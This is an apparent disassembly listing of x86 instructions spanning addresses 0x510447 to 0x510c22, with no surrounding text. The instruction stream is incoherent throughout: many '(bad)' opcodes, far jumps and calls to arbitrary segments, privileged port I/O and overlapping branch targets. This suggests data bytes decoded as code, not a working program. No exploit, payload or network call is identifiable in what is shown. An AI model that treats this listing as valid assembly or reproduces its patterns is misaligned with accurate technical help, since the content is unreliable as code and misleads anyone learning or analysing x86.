  510447:	ret    
  510448:	ret    
  510449:	xchg   BYTE PTR [ecx],ch
  51044b:	sub    al,0xcf
  51044d:	aaa    
  51044e:	xchg   edx,eax
  51044f:	cli    
  510450:	dec    edi
  510451:	fdivp  st(7),st
  510453:	je     0x5104d2
  510455:	jmp    0x51042e
  510457:	popf   
  510458:	cmp    BYTE PTR [ebp-0x37],cl
  51045b:	stos   BYTE PTR es:[edi],al
  51045c:	fimul  DWORD PTR [esi+0x7a]
  51045f:	add    DWORD PTR [edx],edi
  510461:	test   al,0x41
  510463:	nop
  510464:	int3   
  510465:	cmp    DWORD PTR [edx+ecx*4],edx
  510468:	jecxz  0x5104a7
  51046a:	pop    ecx
  51046b:	cs jno 0x5103ee
  51046e:	push   edx
  51046f:	jle    0x5103f3
  510471:	into   
  510472:	loop   0x510441
  510474:	jmp    0xe43d758a
  510479:	leave  
  51047a:	psubusw mm0,mm6
  51047d:	jge    0x510467
  51047f:	pop    esi
  510480:	dec    esi
  510481:	das    
  510482:	push   esi
  510483:	mov    WORD PTR ds:0x8ba7bde9,?
  51048a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  51048b:	arpl   WORD PTR [eax],sp
  51048d:	dec    edx
  51048e:	push   0xffffffab
  510490:	add    DWORD PTR [edx+edi*1-0x41179a45],0xa485ae88
  51049b:	push   0xb
  51049d:	in     eax,dx
  51049e:	xchg   edx,eax
  51049f:	sbb    DWORD PTR [esi-0x30],edi
  5104a2:	retf   0x303d
  5104a5:	in     eax,dx
  5104a6:	push   cs
  5104a7:	rcr    ebp,0xf2
  5104aa:	pop    ds
  5104ab:	sub    DWORD PTR [ebx],edx
  5104ad:	test   eax,0x33e4d450
  5104b2:	test   eax,0x84c4f9f
  5104b7:	(bad)  
  5104b8:	into   
  5104b9:	jbe    0x51048a
  5104bb:	pop    esp
  5104bc:	and    eax,0x5761c803
  5104c1:	inc    ecx
  5104c2:	daa    
  5104c3:	call   0xcce7:0x48e0ea1e
  5104ca:	or     dl,BYTE PTR [edx+ecx*4-0x1e34235c]
  5104d1:	push   eax
  5104d2:	in     al,0xa0
  5104d4:	(bad)  
  5104d5:	mov    al,0xbd
  5104d7:	aam    0xad
  5104d9:	adc    bl,BYTE PTR gs:[edi+esi*4]
  5104dd:	je     0x510506
  5104df:	mov    ch,0x69
  5104e1:	xor    DWORD PTR [ecx],esi
  5104e3:	aad    0xed
  5104e5:	sbb    bl,dh
  5104e7:	dec    ebx
  5104e8:	xlat   BYTE PTR ds:[ebx]
  5104e9:	mov    dl,BYTE PTR [eax]
  5104eb:	idiv   DWORD PTR [esi]
  5104ed:	repnz inc esp
  5104ef:	sub    al,0xf
  5104f1:	mov    cl,0xd2
  5104f3:	loope  0x510544
  5104f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5104f6:	sahf   
  5104f7:	and    al,0x3c
  5104f9:	cmc    
  5104fa:	jne    0x5104fc
  5104fc:	jno    0x51049c
  5104fe:	sub    esi,edi
  510500:	jle    0x51057f
  510502:	ins    DWORD PTR es:[edi],dx
  510503:	mov    bh,0xab
  510505:	gs xor cl,dl
  510508:	mov    esi,0xe51d5cbe
  51050d:	bound  ebx,QWORD PTR [esi+0x78]
  510510:	rol    ecx,1
  510512:	dec    eax
  510513:	mov    ebp,0xf0c9de10
  510518:	xlat   BYTE PTR ds:[ebx]
  510519:	arpl   WORD PTR [eax-0x60],si
  51051c:	daa    
  51051d:	cli    
  51051e:	sbb    al,0x10
  510520:	push   ss
  510521:	jle    0x510542
  510523:	aam    0xaf
  510525:	dec    edi
  510526:	leave  
  510527:	cs dec esi
  510529:	into   
  51052a:	inc    eax
  51052b:	xor    ch,0xb8
  51052e:	xchg   esi,eax
  51052f:	dec    edi
  510530:	loope  0x5104f6
  510532:	jge    0x510513
  510534:	int3   
  510535:	dec    esi
  510536:	stos   DWORD PTR es:[edi],eax
  510537:	mov    dl,0xac
  510539:	sbb    eax,0x65b5450c
  51053e:	(bad)
  510542:	in     eax,dx
  510543:	cmp    ch,al
  510545:	adc    DWORD PTR [ebx],esi
  510547:	inc    esi
  510548:	mov    edi,0xf178f96
  51054d:	js     0x5105c0
  51054f:	jae    0x51050a
  510551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  510552:	ja     0x510582
  510554:	push   cs
  510555:	sub    eax,0xd8bded59
  51055a:	jbe    0x510586
  51055c:	jge    0x51055a
  51055e:	mov    bh,0x19
  510560:	(bad)  
  510561:	xchg   esp,eax
  510562:	xor    eax,0xe354ec9c
  510567:	fisubr DWORD PTR [ecx+ebp*4-0x7f]
  51056b:	pop    es
  51056c:	aam    0x8b
  51056e:	jmp    0xc251:0x2de02069
  510575:	inc    ebp
  510576:	ins    DWORD PTR es:[di],dx
  510578:	add    al,0x47
  51057a:	cmp    BYTE PTR [ebp+0x3ba0b583],ah
  510580:	push   ecx
  510581:	aam    0xc7
  510583:	and    DWORD PTR [ecx-0x5d],0xffffffb3
  510587:	das    
  510588:	lds    ebx,FWORD PTR [edi-0x4062750b]
  51058e:	mov    edx,0x19bdf26f
  510593:	dec    esi
  510594:	and    ebp,DWORD PTR [ebx+0x21ac60c1]
  51059a:	sub    esi,DWORD PTR [ebp-0x1b77e8b9]
  5105a0:	pop    esp
  5105a1:	push   0xc3a929b4
  5105a6:	rcr    DWORD PTR [ebx+0x38],cl
  5105a9:	adc    eax,ebx
  5105ab:	or     DWORD PTR [eiz*4-0x76104b60],esi
  5105b2:	mov    WORD PTR [ecx-0x20323242],es
  5105b8:	mov    dh,0xfa
  5105ba:	call   0x626f:0x70c67231
  5105c1:	sbb    eax,0x5e7bcfcf
  5105c6:	das    
  5105c7:	adc    ebx,0x74cdadbb
  5105cd:	cmp    ecx,DWORD PTR [ebx+0x3b961ee3]
  5105d3:	inc    esp
  5105d4:	push   cs
  5105d5:	adc    bh,BYTE PTR [eax+0xb5d501c]
  5105db:	adc    al,0xcf
  5105dd:	icebp  
  5105de:	jmp    FWORD PTR [esi+ecx*4-0x4]
  5105e2:	add    dl,BYTE PTR [ebx]
  5105e4:	int    0x4c
  5105e6:	stos   BYTE PTR es:[edi],al
  5105e7:	cmp    eax,0x6ee31cd0
  5105ec:	and    DWORD PTR [esi],esp
  5105ee:	push   0x36c1dd16
  5105f3:	inc    edx
  5105f4:	and    bl,BYTE PTR [ebp+0x7a]
  5105f7:	js     0x510662
  5105f9:	lahf   
  5105fa:	pop    esi
  5105fb:	cmp    al,0x18
  5105fd:	pop    ecx
  5105fe:	xchg   ah,dl
  510600:	sbb    eax,0x4dd1becd
  510605:	ret    
  510606:	(bad)  [eax+0x78f4bb84]
  51060c:	pop    edx
  51060d:	push   ebx
  51060e:	cdq    
  51060f:	inc    edi
  510610:	dec    ebx
  510611:	lea    ebx,[ecx-0x1a]
  510614:	add    bh,ah
  510616:	call   0x7aa:0xc364fef0
  51061d:	lds    ecx,FWORD PTR [ebx+0x6f5b9560]
  510623:	imul   eax,DWORD PTR [edi],0xfffffff0
  510626:	(bad)  
  510627:	hlt    
  510628:	adc    BYTE PTR [eax],dl
  51062a:	push   ds
  51062b:	cmp    BYTE PTR [ecx+0x4bb2f02a],al
  510631:	pop    ss
  510632:	les    ebx,FWORD PTR [edi]
  510634:	sub    eax,0x3079ea7e
  510639:	sbb    bl,BYTE PTR [ecx+ebx*1+0xafa186a]
  510640:	stos   DWORD PTR es:[edi],eax
  510641:	outs   dx,DWORD PTR ds:[esi]
  510642:	or     DWORD PTR [eax-0x26],0x14
  510646:	mov    ss,WORD PTR [ebx-0x49d9da3e]
  51064c:	ror    BYTE PTR [eax],1
  51064e:	and    dl,BYTE PTR [ebx-0x43ca573e]
  510654:	jmp    0x80325bed
  510659:	sub    al,0xeb
  51065b:	cmp    al,0x94
  51065d:	inc    eax
  51065e:	mov    esp,0x25a60be1
  510663:	fcomp  DWORD PTR fs:[ebx]
  510666:	shr    DWORD PTR [eax+eiz*2+0x301ef65b],cl
  51066d:	call   0xb5f8a199
  510672:	xor    DWORD PTR [edi-0x1e],eax
  510675:	xchg   ecx,eax
  510676:	in     eax,0xa3
  510678:	or     eax,0x1e4224c7
  51067d:	xchg   DWORD PTR [esi-0xb46de6d],ecx
  510683:	mov    al,0x4f
  510685:	(bad)  
  510686:	in     eax,0xff
  510688:	jo     0x5106ca
  51068a:	call   0x1786:0xe380012f
  510691:	xchg   edi,eax
  510692:	lahf   
  510693:	sar    DWORD PTR [edx],cl
  510695:	inc    esi
  510696:	xlat   BYTE PTR ds:[ebx]
  510697:	iret   
  510698:	dec    edx
  510699:	das    
  51069a:	jne    0x51069a
  51069c:	int    0x2b
  51069e:	push   0xffffffb4
  5106a0:	call   0x1c998220
  5106a5:	push   0xca78eb3c
  5106aa:	cmc    
  5106ab:	jmp    0x5106c0
  5106ad:	lea    ebx,[edi+ebx*8+0x54b835d1]
  5106b4:	fnstsw WORD PTR [eax+0x42]
  5106b7:	pop    ecx
  5106b8:	dec    ebx
  5106b9:	loope  0x5106ae
  5106bb:	sbb    esp,DWORD PTR cs:[eax]
  5106be:	or     eax,0xdfcc35c4
  5106c3:	ret    0x22a3
  5106c6:	mov    ebp,0xe1de979a
  5106cb:	inc    edx
  5106cc:	mov    al,0x1b
  5106ce:	int3   
  5106cf:	cs jp  0x5106f7
  5106d2:	lds    edi,FWORD PTR [edx+0x282ab4e2]
  5106d8:	jnp    0x5106df
  5106da:	mov    ds:0x9beaf180,eax
  5106df:	jbe    0x510684
  5106e1:	and    eax,0x3e68ee56
  5106e6:	xor    ch,BYTE PTR [eax+0x2cae9425]
  5106ec:	repnz ins DWORD PTR es:[edi],dx
  5106ee:	push   ebp
  5106ef:	adc    DWORD PTR [esi+0x21],ecx
  5106f2:	cdq    
  5106f3:	jp     0x510757
  5106f5:	jo     0x510734
  5106f7:	sbb    al,0xbe
  5106f9:	ret    
  5106fa:	xor    al,bl
  5106fc:	mov    dh,0x86
  5106fe:	add    DWORD PTR [edx+0x29aec2c9],0xffffffa7
  510705:	jg     0x510746
  510707:	mov    ?,esi
  510709:	mov    al,ds:0xfb6f5a75
  51070e:	nop
  51070f:	mov    dh,0xbc
  510711:	ja     0x5106b7
  510713:	ins    DWORD PTR es:[edi],dx
  510714:	scas   eax,DWORD PTR es:[edi]
  510715:	in     al,0x7e
  510717:	mov    edx,0x99f49a3b
  51071c:	das    
  51071d:	push   esp
  51071e:	and    al,0x4d
  510720:	out    dx,al
  510721:	add    DWORD PTR [ebx+0x2f],eax
  510724:	and    ch,BYTE PTR [eax-0x5d]
  510727:	xchg   ecx,eax
  510728:	int3   
  510729:	fsub   QWORD PTR [edx]
  51072b:	dec    esp
  51072c:	push   ecx
  51072d:	ret    0xb890
  510730:	cmp    esp,esp
  510732:	push   0x23
  510734:	xchg   ebp,edx
  510736:	(bad)  
  510737:	lock dec esi
  510739:	push   ss
  51073a:	dec    edi
  51073b:	jmp    0xea42c1a5
  510740:	inc    ecx
  510741:	stos   DWORD PTR es:[edi],eax
  510742:	mov    ds,WORD PTR [edi+eax*2+0x4d]
  510746:	in     al,0x82
  510748:	sub    al,0x85
  51074a:	jnp    0x510799
  51074c:	xor    esi,0x1
  51074f:	scas   al,BYTE PTR es:[edi]
  510750:	dec    edi
  510751:	jl     0x5106e0
  510753:	shl    BYTE PTR [edx+0x4677c1a0],cl
  510759:	fs jge 0x5107b7
  51075c:	jp     0x51078d
  51075e:	out    dx,eax
  51075f:	inc    eax
  510760:	push   ebx
  510761:	dec    esi
  510762:	mov    ecx,ebp
  510764:	test   BYTE PTR [ecx+0x69],0x7d
  510768:	js     0x510706
  51076a:	js     0x51072d
  51076c:	jnp    0x5107cb
  51076e:	ret    
  51076f:	mov    ch,0xaf
  510771:	scas   al,BYTE PTR es:[edi]
  510772:	int3   
  510773:	cwde   
  510774:	pop    ds
  510775:	pop    eax
  510776:	dec    esp
  510777:	shl    DWORD PTR [esi-0x626170a5],cl
  51077d:	jmp    0xbd1c:0xb5e5e297
  510784:	loop   0x5107b5
  510786:	(bad)  [ebx+esi*2+0x69]
  51078a:	out    dx,al
  51078b:	(bad)  
  51078c:	sub    bh,dh
  51078e:	pop    es
  51078f:	arpl   WORD PTR [ebp+ebx*1+0x23d9a8c1],bx
  510796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  510797:	into   
  510798:	cs retf 0x8bc3
  51079c:	lds    edi,FWORD PTR [ecx-0x54b8c824]
  5107a2:	dec    edx
  5107a3:	fidiv  DWORD PTR [ecx-0x58534419]
  5107a9:	add    eax,0xbef6f6d1
  5107ae:	int3   
  5107af:	push   ebp
  5107b0:	adc    BYTE PTR [edx],dl
  5107b2:	js     0x5107aa
  5107b4:	push   ebx
  5107b5:	push   0x37
  5107b7:	xchg   ebp,eax
  5107b8:	sbb    eax,0x4540ba16
  5107bd:	pop    edi
  5107be:	pop    esp
  5107bf:	add    dh,al
  5107c1:	popf   
  5107c2:	dec    ebx
  5107c3:	sti    
  5107c4:	xor    edx,DWORD PTR [ecx-0xb9598b9]
  5107ca:	mov    esi,0xf05217d
  5107cf:	cmp    dl,0xde
  5107d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5107d3:	bound  esp,QWORD PTR [ebp+0x32]
  5107d6:	cmp    al,0x2d
  5107d8:	pop    ss
  5107d9:	fs stc 
  5107db:	dec    edi
  5107dc:	xchg   ecx,eax
  5107dd:	or     eax,0x8909c00b
  5107e2:	xor    BYTE PTR [edi],bl
  5107e4:	inc    ebp
  5107e5:	and    ebp,DWORD PTR [eax]
  5107e7:	inc    esi
  5107e8:	xchg   esi,eax
  5107e9:	ficom  DWORD PTR [esi-0x4bffffa7]
  5107ef:	sub    DWORD PTR [ecx-0x2d],0x7c
  5107f3:	fistp  DWORD PTR [edx-0x24f35a74]
  5107f9:	and    al,0xb8
  5107fb:	(bad)
  5107ff:	dec    ebx
  510800:	lods   al,BYTE PTR ds:[esi]
  510801:	jp     0x5107ec
  510803:	cmc    
  510804:	out    0xe,al
  510806:	sub    eax,0x408a57c7
  51080b:	mov    cl,ah
  51080d:	rcl    edx,0x59
  510810:	scas   al,BYTE PTR es:[edi]
  510811:	imul   esp,DWORD PTR [ebp-0x736e0f17],0x9323e8f7
  51081b:	in     eax,dx
  51081c:	cdq    
  51081d:	retf   0x40fe
  510820:	clc    
  510821:	fwait
  510822:	and    dh,bl
  510824:	scas   eax,DWORD PTR es:[edi]
  510825:	xor    esp,ebp
  510827:	sbb    BYTE PTR [eax-0x57f0417c],bh
  51082d:	mov    ds:0x70b67521,eax
  510832:	dec    ebx
  510833:	loop   0x51081a
  510835:	pop    esi
  510837:	cdq    
  510838:	and    esp,DWORD PTR [esi-0x77addefd]
  51083e:	bound  eax,QWORD PTR [edi+0x41cd50d4]
  510844:	mov    esi,0xd54ea0f
  510849:	ins    DWORD PTR es:[edi],dx
  51084a:	sub    DWORD PTR [edx+0x19e61f1f],0xfffffff1
  510851:	xchg   ecx,eax
  510852:	aas    
  510853:	fwait
  510854:	dec    esp
  510855:	mov    eax,0xddd881f0
  51085a:	pop    ds
  51085b:	lea    ecx,[edx-0x481ad87f]
  510861:	shl    BYTE PTR [eax-0x68],1
  510864:	les    esi,FWORD PTR [ecx+0x2416be23]
  51086a:	imul   esp,DWORD PTR [edx],0x9d743adc
  510870:	ds sub al,0x5f
  510873:	sbb    al,0xb5
  510875:	pop    eax
  510876:	push   ds
  510877:	push   ebx
  510878:	(bad)  
  510879:	mov    dh,0x4c
  51087b:	mov    bh,0x14
  51087d:	adc    eax,0xbd49037b
  510882:	jnp    0x51085d
  510884:	addr16 pop edi
  510886:	jmp    0xe072988b
  51088b:	cdq    
  51088c:	fnstenv [ebp+ebp*4-0x60]
  510890:	xor    eax,ebx
  510892:	stc    
  510893:	scas   eax,DWORD PTR es:[edi]
  510894:	dec    eax
  510895:	inc    ecx
  510896:	sbb    al,0x78
  510898:	aas    
  510899:	or     BYTE PTR [ecx+0x46],al
  51089c:	test   DWORD PTR [esi+0x46e7a800],edi
  5108a2:	pop    edx
  5108a3:	lea    edx,[esi+edx*1]
  5108a6:	repz out dx,al
  5108a8:	xchg   ch,bl
  5108aa:	pop    eax
  5108ab:	cmp    cl,BYTE PTR [eax+0x79ac2fd8]
  5108b1:	jmp    0x5108e2
  5108b3:	shl    BYTE PTR ds:0xee3f6345,cl
  5108b9:	pop    ebx
  5108ba:	push   eax
  5108bb:	mov    ebx,0x6e7d2a45
  5108c0:	aas    
  5108c1:	sub    al,0xe7
  5108c3:	lahf   
  5108c4:	retf   
  5108c5:	xchg   edi,eax
  5108c6:	test   BYTE PTR [ebx],ch
  5108c8:	mov    ah,0x2e
  5108ca:	cdq    
  5108cb:	leave  
  5108cc:	ss jmp 0x8bf2311c
  5108d2:	scas   eax,DWORD PTR es:[edi]
  5108d3:	inc    esi
  5108d4:	daa    
  5108d5:	fimul  DWORD PTR [edi+0x5229e57f]
  5108db:	pop    edi
  5108dc:	in     eax,dx
  5108dd:	or     DWORD PTR [esi-0x5b],ebp
  5108e0:	mov    ebx,0xb4c6833b
  5108e5:	int    0xa3
  5108e7:	dec    dh
  5108e9:	sbb    al,0x50
  5108eb:	loopne 0x510874
  5108ed:	fiadd  WORD PTR [edi+0x50]
  5108f0:	and    dh,BYTE PTR [ebx]
  5108f2:	xchg   al,bh
  5108f4:	jge    0x51092c
  5108f6:	push   ebx
  5108f7:	jne    0x510956
  5108f9:	xchg   ebp,eax
  5108fa:	in     al,0xa0
  5108fc:	jmp    0xee7e:0xd5b39812
  510903:	adc    bh,BYTE PTR [edx-0x15]
  510906:	in     eax,dx
  510907:	retf   
  510908:	mov    bl,0x69
  51090a:	sti    
  51090b:	mov    ds:0x398705ec,eax
  510910:	cmp    BYTE PTR [edi+0x1d],0xb2
  510914:	fnsave [ecx+edx*4+0x28b9e53b]
  51091b:	ret    
  51091c:	mov    ecx,0xddad4dfa
  510921:	test   eax,0x310c87d6
  510926:	xchg   ebx,eax
  510927:	mov    al,0xe9
  510929:	pop    esp
  51092a:	(bad)  
  51092b:	pop    esp
  51092c:	push   esp
  51092d:	and    ch,BYTE PTR [ecx-0x2ce95b66]
  510933:	vdivps xmm3,xmm6,xmm5
  510937:	sahf   
  510938:	fwait
  510939:	adc    eax,0xef0df333
  51093e:	inc    esi
  51093f:	ins    BYTE PTR es:[edi],dx
  510940:	inc    esi
  510941:	mov    DWORD PTR [edi+edi*2+0x6c4ccef1],ebx
  510948:	push   ecx
  510949:	adc    eax,0x295f96b
  51094e:	pop    eax
  51094f:	xchg   ecx,eax
  510950:	inc    edi
  510951:	inc    esp
  510952:	ror    DWORD PTR [edx-0x64],cl
  510955:	mov    dl,0x33
  510957:	sahf   
  510958:	sub    esp,DWORD PTR [edi]
  51095a:	jbe    0x510974
  51095c:	out    dx,eax
  51095d:	cld    
  51095e:	push   gs
  510960:	(bad)  
  510961:	fnstsw WORD PTR [esp+edx*2]
  510964:	pushf  
  510965:	scas   eax,DWORD PTR es:[edi]
  510966:	pusha  
  510967:	scas   eax,DWORD PTR es:[edi]
  510968:	mov    ebx,0xe1c857f1
  51096d:	inc    edx
  51096e:	aas    
  51096f:	adc    ah,BYTE PTR [eax+eiz*1-0x5e]
  510973:	ins    BYTE PTR es:[edi],dx
  510974:	adc    al,0xe2
  510976:	fmul   QWORD PTR [edi+eax*8+0x4141299e]
  51097e:	sub    ebx,esp
  510980:	test   BYTE PTR [edx],dh
  510982:	jg     0x51098b
  510984:	or     ch,BYTE PTR [ecx]
  510986:	jmp    0x510999
  510988:	stc    
  510989:	ret    
  51098a:	mov    cs,WORD PTR [ebx]
  51098c:	out    0xb5,al
  51098e:	pop    edx
  51098f:	pop    esi
  510990:	and    dh,bl
  510992:	fucompp 
  510994:	fdivrp st(2),st
  510996:	shl    DWORD PTR [eax],cl
  510998:	inc    esp
  510999:	sub    BYTE PTR [edi],al
  51099b:	or     eax,esp
  51099d:	mov    bh,0x68
  51099f:	xchg   ebp,eax
  5109a0:	inc    esi
  5109a1:	cmp    ch,bl
  5109a3:	sbb    BYTE PTR [edx-0x6ce10c0d],bl
  5109a9:	sub    eax,ecx
  5109ab:	cdq    
  5109ac:	enter  0xe878,0x56
  5109b0:	stos   BYTE PTR es:[edi],al
  5109b1:	push   ecx
  5109b2:	outs   dx,DWORD PTR ds:[esi]
  5109b3:	xor    bh,cl
  5109b5:	xchg   ah,ah
  5109b7:	mov    eax,0x772a7c25
  5109bc:	push   es
  5109bd:	and    bl,dl
  5109bf:	loop   0x5109ae
  5109c1:	in     al,0xc5
  5109c3:	and    DWORD PTR [eax],edx
  5109c5:	(bad)
  5109c9:	(bad)  
  5109ca:	lods   al,BYTE PTR ds:[esi]
  5109cb:	test   DWORD PTR [eax-0x34],ecx
  5109ce:	add    DWORD PTR [edi-0x33731527],ebx
  5109d4:	mov    edi,0xb73d655f
  5109d9:	add    ecx,DWORD PTR ds:0xa840d88c
  5109df:	ins    DWORD PTR es:[edi],dx
  5109e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5109e1:	dec    eax
  5109e2:	aaa    
  5109e3:	mov    ah,0x1e
  5109e5:	xchg   esi,eax
  5109e6:	pop    ebp
  5109e7:	cli    
  5109e8:	das    
  5109e9:	fld    TBYTE PTR [edi+0x47d2444e]
  5109ef:	push   edx
  5109f0:	pop    edx
  5109f1:	(bad)  
  5109f4:	pop    ds
  5109f5:	imul   DWORD PTR [ebx+0x3411c570]
  5109fb:	xor    DWORD PTR [ebp-0x7294ff9b],0xeacad659
  510a05:	mov    ds:0xe3cc175b,al
  510a0a:	lods   eax,DWORD PTR ds:[esi]
  510a0b:	mov    eax,0x57003005
  510a10:	sub    BYTE PTR [esi+0x15416b7],al
  510a16:	mov    edi,0x2413291a
  510a1b:	push   esp
  510a1c:	mov    cl,0xde
  510a1e:	call   0x2e815186
  510a23:	and    DWORD PTR [ecx],ebx
  510a25:	bound  eax,QWORD PTR [edx-0x56]
  510a28:	icebp  
  510a29:	jnp    0x5109d3
  510a2b:	in     al,dx
  510a2c:	mov    ds:0xb019cc8b,eax
  510a31:	loope  0x510a31
  510a33:	cli    
  510a34:	rcr    BYTE PTR [esi+0x4a3f426],cl
  510a3a:	adc    al,BYTE PTR [ebx-0x2df3d2ca]
  510a40:	into   
  510a41:	push   ebx
  510a42:	and    bl,bh
  510a44:	imul   ecx
  510a46:	enter  0xb52a,0xa1
  510a4a:	mov    esi,edx
  510a4c:	pop    esi
  510a4d:	div    dh
  510a4f:	dec    ebp
  510a50:	jge    0x510a00
  510a52:	ins    BYTE PTR es:[edi],dx
  510a53:	cmp    DWORD PTR [eax+eiz*8],eax
  510a56:	lods   eax,DWORD PTR ds:[esi]
  510a57:	xor    DWORD PTR [edi],eax
  510a59:	rcl    edi,1
  510a5b:	out    dx,eax
  510a5c:	inc    edi
  510a5d:	xchg   DWORD PTR [ebx+0x266a9a91],eax
  510a63:	aas    
  510a64:	xor    al,0x4a
  510a66:	lock out 0x3,al
  510a69:	mov    ebx,0xd5733173
  510a6e:	mov    bh,0x7c
  510a70:	les    esp,FWORD PTR [edi+0x5f]
  510a73:	jle    0x510a33
  510a75:	mov    edx,0x21b88dd1
  510a7a:	ficom  DWORD PTR [ebx+0x62cbf3f8]
  510a80:	lock es dec edx
  510a83:	adc    eax,0x4f46e121
  510a88:	imul   DWORD PTR [ebp+0x63]
  510a8b:	push   esi
  510a8c:	adc    eax,0x1f02bafd
  510a91:	push   ecx
  510a92:	loop   0x510ac7
  510a94:	mov    DWORD PTR [ebx],esp
  510a96:	test   BYTE PTR [eax-0x9019b81],ah
  510a9c:	mov    ebp,0x294a1928
  510aa1:	loop   0x510a5e
  510aa3:	aas    
  510aa4:	or     esp,0xfffffff1
  510aa7:	(bad)  
  510aa8:	sub    ah,BYTE PTR [ecx]
  510aaa:	int3   
  510aab:	push   ebp
  510aac:	add    eax,0x35f9b881
  510ab1:	xchg   ecx,eax
  510ab2:	pop    es
  510ab3:	sbb    DWORD PTR [ebp-0x7a],ebx
  510ab6:	inc    esp
  510ab7:	and    ch,BYTE PTR cs:[edi+0x6c]
  510abb:	push   0x8ebcfb57
  510ac0:	xor    al,0x9a
  510ac2:	retf   0x83d5
  510ac5:	rcr    DWORD PTR [edi+0x4cbddd42],1
  510acb:	cwde   
  510acc:	pop    ds
  510acd:	sbb    DWORD PTR [ecx-0x2bd44c6e],edx
  510ad3:	stc    
  510ad4:	ins    DWORD PTR es:[edi],dx
  510ad5:	add    cl,dl
  510ad7:	pop    es
  510ad8:	sar    BYTE PTR [esi-0x77d3114a],0xeb
  510adf:	jle    0x510b43
  510ae1:	jmp    0x670fbf87
  510ae6:	fptan  
  510ae8:	adc    ah,bh
  510aea:	int3   
  510aeb:	gs fwait
  510aed:	mov    ecx,ebp
  510aef:	imul   edx,DWORD PTR [edx+0x79],0x34
  510af3:	or     edx,DWORD PTR [eax-0x3d]
  510af6:	repz cli 
  510af8:	(bad)  
  510af9:	shr    BYTE PTR [ebp-0x49],cl
  510afc:	mov    DWORD PTR [esi],edi
  510afe:	dec    eax
  510aff:	xchg   ebx,eax
  510b00:	in     al,0x52
  510b02:	cmp    BYTE PTR [ecx+0x5327549c],0x83
  510b09:	xor    BYTE PTR [ebx],ch
  510b0b:	xchg   ebx,eax
  510b0c:	mov    edx,0x3ed08453
  510b11:	test   al,0xca
  510b13:	repnz cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  510b16:	mov    dh,0x92
  510b18:	xchg   ebx,eax
  510b19:	into   
  510b1a:	push   esi
  510b1b:	inc    edi
  510b1c:	nop
  510b1d:	data16 out dx,al
  510b1f:	mov    ds:0x8529b24a,eax
  510b24:	es ss call 0x2631:0xefcfef76
  510b2d:	shr    BYTE PTR [ecx],cl
  510b2f:	push   ss
  510b30:	cli    
  510b31:	icebp  
  510b32:	xchg   esi,eax
  510b33:	xor    ebp,ebp
  510b35:	repnz mov cl,BYTE PTR [ecx-0x48]
  510b39:	sub    eax,edx
  510b3b:	inc    edi
  510b3c:	dec    esp
  510b3d:	fdivrp st(1),st
  510b3f:	inc    edi
  510b40:	loope  0x510b38
  510b42:	mov    eax,0xbfbb8d26
  510b47:	mov    edx,0x5b62cc76
  510b4c:	sbb    ecx,ebx
  510b4e:	jnp    0x510adf
  510b50:	inc    esp
  510b51:	(bad)  
  510b52:	mov    edx,0x2840d756
  510b57:	ins    DWORD PTR es:[edi],dx
  510b58:	mov    edx,edi
  510b5a:	push   ebx
  510b5b:	loopne 0x510b6b
  510b5d:	fldenv [esi]
  510b5f:	xor    eax,0xdcdf0cf8
  510b64:	xlat   BYTE PTR ds:[bx]
  510b66:	inc    esp
  510b67:	ffreep st(7)
  510b69:	fwait
  510b6a:	and    al,0x37
  510b6c:	test   al,0xd3
  510b6e:	sbb    bl,bl
  510b70:	ds ss mov ecx,0x6c9671
  510b77:	mov    ch,0xda
  510b79:	mov    DWORD PTR [edi-0x55dd745d],ebx
  510b7f:	dec    ecx
  510b80:	mov    ch,0x79
  510b82:	mov    al,0x84
  510b84:	icebp  
  510b85:	inc    ebx
  510b86:	pop    eax
  510b87:	push   edi
  510b88:	scas   al,BYTE PTR es:[edi]
  510b89:	(bad)  
  510b8a:	aam    0x38
  510b8c:	xor    ebx,DWORD PTR [esi]
  510b8e:	xchg   ebp,eax
  510b8f:	cwde   
  510b90:	cmp    ecx,DWORD PTR ds:0xe9f6edf1
  510b96:	pop    ebp
  510b97:	in     eax,0xb
  510b99:	popa   
  510b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  510b9b:	pop    es
  510b9c:	test   al,0x1f
  510b9e:	jecxz  0x510bbc
  510ba0:	cdq    
  510ba1:	ret    
  510ba2:	xchg   ebx,eax
  510ba3:	sub    al,BYTE PTR [esi+0x9186bae]
  510ba9:	sbb    BYTE PTR [esi+0x1e],0x30
  510bad:	mov    WORD PTR ds:0xe8287529,gs
  510bb3:	push   edx
  510bb4:	stos   DWORD PTR es:[edi],eax
  510bb5:	stos   DWORD PTR es:[edi],eax
  510bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  510bb7:	push   esp
  510bb8:	lock mov ss,WORD PTR [edx+0xc]
  510bbc:	xor    DWORD PTR [ebp+edi*1+0x4c171341],ebp
  510bc3:	xchg   ebx,eax
  510bc4:	mov    esp,0xb2022a27
  510bc9:	idiv   BYTE PTR [edx*1+0x3cf93d4b]
  510bd0:	add    dh,dl
  510bd2:	pop    ebx
  510bd3:	sub    cl,BYTE PTR es:0xe9d81900
  510bda:	test   eax,0xc5be2434
  510bdf:	ret    
  510be0:	les    esp,FWORD PTR [ebx]
  510be2:	(bad)  
  510be3:	(bad)  
  510be4:	fistp  DWORD PTR [ecx-0xe]
  510be7:	xchg   esp,eax
  510be8:	pop    ss
  510be9:	out    0x6e,eax
  510beb:	inc    esp
  510bec:	repnz mov edx,0x957add9b
  510bf2:	fnsave [ebx+0x23]
  510bf5:	stos   BYTE PTR es:[edi],al
  510bf6:	mov    ebx,0x5928d09e
  510bfb:	popa   
  510bfc:	cmp    DWORD PTR [esi-0x4d],0xa
  510c00:	sti    
  510c01:	pop    ss
  510c02:	xlat   BYTE PTR ds:[ebx]
  510c03:	jmp    0xc690:0x70996a6b
  510c0a:	(bad)  
  510c0c:	scas   al,BYTE PTR es:[edi]
  510c0d:	jo     0x510bfc
  510c0f:	es repnz (bad) 
  510c12:	js     0x510c87
  510c14:	dec    ebp
  510c15:	dec    ecx
  510c16:	sar    DWORD PTR [ebx-0x26],0xae
  510c1a:	dec    edi
  510c1b:	add    eax,0xb873718f
  510c20:	test   BYTE PTR [edx],ch
  510c22:	sbb    ch,BYTE PTR [ebp+0x23]
